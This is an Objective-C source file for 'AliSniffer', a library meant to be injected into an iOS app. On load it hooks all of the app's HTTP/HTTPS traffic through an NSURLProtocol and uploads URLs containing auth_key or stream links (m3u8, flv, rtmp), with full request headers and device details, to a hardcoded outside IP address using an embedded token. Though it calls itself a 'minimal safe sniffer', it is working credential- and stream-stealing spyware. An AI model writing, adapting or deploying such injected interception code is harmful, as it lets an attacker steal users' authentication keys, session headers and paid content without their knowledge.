
//
// AliSniffer_min_safe_filtered.m
// Minimal safe sniffer with noise filtering and auth_key priority.
// - Registers a lightweight NSURLProtocol to observe HTTP/HTTPS requests.
// - Filters out known noise (analytics/logging) and only uploads playable URLs or those containing auth_key.
// - Uploads each relevant capture to kLogUploadEndpoint as JSON.
//
// Change kLogUploadEndpoint / kLogUploadToken to your server before injection.
//
#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>

#define LOG(...) NSLog(__VA_ARGS__)

static NSString * const kLogUploadEndpoint = @"http://139.155.57.242:8088/api/push_raw";
static NSString * const kLogUploadToken    = @"@Yy166431";

static void UploadLogLineAsync(NSString *note, NSString *url, NSDictionary *headers) {
    if (!url) url = @"";
    NSMutableDictionary *payload = [NSMutableDictionary dictionary];
    payload[@"note"] = note ?: @"";
    payload[@"url"] = url ?: @"";
    payload[@"time"] = @([[NSDate date] timeIntervalSince1970]);
    if (headers && headers.count) payload[@"headers"] = headers;
    payload[@"device"] = @{ @"name": UIDevice.currentDevice.name ?: @"", @"sys": UIDevice.currentDevice.systemVersion ?: @"" };
    NSData *d = nil;
    @try { d = [NSJSONSerialization dataWithJSONObject:payload options:0 error:NULL]; } @catch(...) { d = nil; }
    if (!d) return;
    NSURL *u = [NSURL URLWithString:kLogUploadEndpoint];
    if (!u) return;
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:u];
    req.HTTPMethod = @"POST";
    [req setValue:kLogUploadToken forHTTPHeaderField:@"X-Token"];
    [req setValue:@"application/json; charset=utf-8" forHTTPHeaderField:@"Content-Type"];
    req.HTTPBody = d;
    NSURLSessionConfiguration *cfg = [NSURLSessionConfiguration ephemeralSessionConfiguration];
    cfg.timeoutIntervalForRequest = 8.0;
    NSURLSession *s = [NSURLSession sessionWithConfiguration:cfg];
    NSURLSessionDataTask *t = [s dataTaskWithRequest:req completionHandler:^(__unused NSData * _Nullable data, __unused NSURLResponse * _Nullable resp, NSError * _Nullable err) {
        if (err) LOG(@"[AliSniffer][UPLOAD] err: %@", err);
    }];
    [t resume];
}

static void DebugLog(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    @try { NSLog(@"[AliSniffer][MIN-F] %@", s); } @catch(...) {}
}

// ===== Filtering helpers =====
static inline BOOL HasAuthKeyInURL(NSString *url) {
    if (!url) return NO;
    NSString *l = url.lowercaseString;
    return ([l containsString:@"auth_key="] || [l containsString:@"authkey="]);
}
static inline BOOL IsPlayableCandidate(NSString *url) {
    if (!url) return NO;
    NSString *l = url.lowercaseString;
    if ([l containsString:@"m3u8"] || [l containsString:@".mp4"] || [l containsString:@".flv"]) return YES;
    if ([l hasPrefix:@"rtmp://"] || [l hasPrefix:@"rtmps://"]) return YES;
    if (([l hasPrefix:@"ws://"] || [l hasPrefix:@"wss://"]) && [l containsString:@".flv"]) return YES;
    return NO;
}
static inline BOOL IsKnownNoise(NSString *url) {
    if (!url) return NO;
    NSString *l = url.lowercaseString;
    NSArray *noise = @[@"ulogs.umeng.com", @"umeng", @"log.aliyuncs.com", @"beacon", @"/monitor", @"/ums", @"collect", @"analytics", @"sentry", @"ingress", @"ping", @"stats"];
    for (NSString *n in noise) {
        if ([l containsString:n]) return YES;
    }
    return NO;
}

// Filtered report: only upload if auth_key present or looks like playable; otherwise skip (but still log locally)
static void FilteredReportAndUpload(NSString *url, NSDictionary *hdrs, NSString *note) {
    if (!url) url = @"";
    if (IsKnownNoise(url) && !HasAuthKeyInURL(url)) {
        DebugLog(@"SKIP noise url=%@", url);
        return;
    }
    if (HasAuthKeyInURL(url)) {
        DebugLog(@"UPLOAD (auth_key) url=%@", url);
        UploadLogLineAsync([NSString stringWithFormat:@"%@|auth_key", note ?: @"min_proto"], url, hdrs ?: @{});
        return;
    }
    if (IsPlayableCandidate(url)) {
        DebugLog(@"UPLOAD (candidate) url=%@", url);
        UploadLogLineAsync([NSString stringWithFormat:@"%@|candidate", note ?: @"min_proto"], url, hdrs ?: @{});
        return;
    }
    DebugLog(@"SKIP not-playable url=%@", url);
}

// Minimal NSURLProtocol that simply observes requests and lets them proceed.
@interface _MinObserveProto : NSURLProtocol <NSURLSessionDataDelegate>
@property(nonatomic,strong) NSURLSessionDataTask *task;
@end

@implementation _MinObserveProto
+ (BOOL)canInitWithRequest:(NSURLRequest *)request {
    @try {
        if (!request || !request.URL) return NO;
        if ([NSURLProtocol propertyForKey:@"_alisniffer_min" inRequest:request]) return NO;
        NSString *scheme = request.URL.scheme.lowercaseString ?: @"";
        if ([scheme isEqualToString:@"http"] || [scheme isEqualToString:@"https"]) return YES;
    } @catch(...) {}
    return NO;
}
+ (NSURLRequest *)canonicalRequestForRequest:(NSURLRequest *)request { return request; }

- (void)startLoading {
    NSMutableURLRequest *r = [self.request mutableCopy];
    @try { [NSURLProtocol setProperty:@YES forKey:@"_alisniffer_min" inRequest:r]; } @catch(...) {}
    @try { FilteredReportAndUpload(r.URL.absoluteString, r.allHTTPHeaderFields ?: @{}, @"min_proto"); } @catch(...) {}
    // Perform the real request with default session and stream results back to client.
    NSURLSessionConfiguration *cfg = [NSURLSessionConfiguration defaultSessionConfiguration];
    NSURLSession *s = [NSURLSession sessionWithConfiguration:cfg delegate:self delegateQueue:nil];
    self.task = [s dataTaskWithRequest:r];
    [self.task resume];
}

- (void)stopLoading {
    @try { [self.task cancel]; } @catch(...) {}
    self.task = nil;
}

- (void)URLSession:(NSURLSession *)session dataTask:(NSURLSessionDataTask *)dataTask didReceiveData:(NSData *)data {
    @try { [self.client URLProtocol:self didLoadData:data]; } @catch(...) {}
}

- (void)URLSession:(NSURLSession *)session task:(NSURLSessionTask *)task didCompleteWithError:(NSError *)error {
    if (error) {
        @try { [self.client URLProtocol:self didFailWithError:error]; } @catch(...) {}
    } else {
        @try { [self.client URLProtocolDidFinishLoading:self]; } @catch(...) {}
    }
}
@end

// Constructor: register the minimal protocol safely.
__attribute__((constructor))
static void _alisniffer_min_init(void) {
    @autoreleasepool {
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.2 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            @try {
                [NSURLProtocol registerClass:[_MinObserveProto class]];
                DebugLog(@"registered minimal protocol");
                // upload a heartbeat so you can confirm endpoint is reachable
                UploadLogLineAsync(@"init", @"alisniffer_min_loaded", @{@"note":@"init"});
            } @catch (NSException *e) {
                DebugLog(@"register failed: %@", e);
            }
        });
    }
}
